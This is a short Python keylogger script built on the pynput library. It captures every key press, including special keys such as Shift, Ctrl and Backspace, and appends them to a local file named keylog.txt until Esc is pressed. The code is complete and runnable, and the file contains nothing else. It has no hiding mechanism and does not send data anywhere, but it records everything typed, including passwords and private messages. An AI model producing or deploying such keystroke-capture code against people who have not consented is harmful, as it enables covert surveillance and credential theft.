from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        if hasattr(key, "char"):
            f.write(key.char)
        elif key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        elif key == Key.tab:
            f.write("[TAB]")
        elif key == Key.esc:
            f.write("[ESC]")
        elif key == Key.shift:
            f.write("[SHIFT]")
        elif key == Key.ctrl:
            f.write("[CTRL]")
        elif key == Key.alt:
            f.write("[ALT]")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()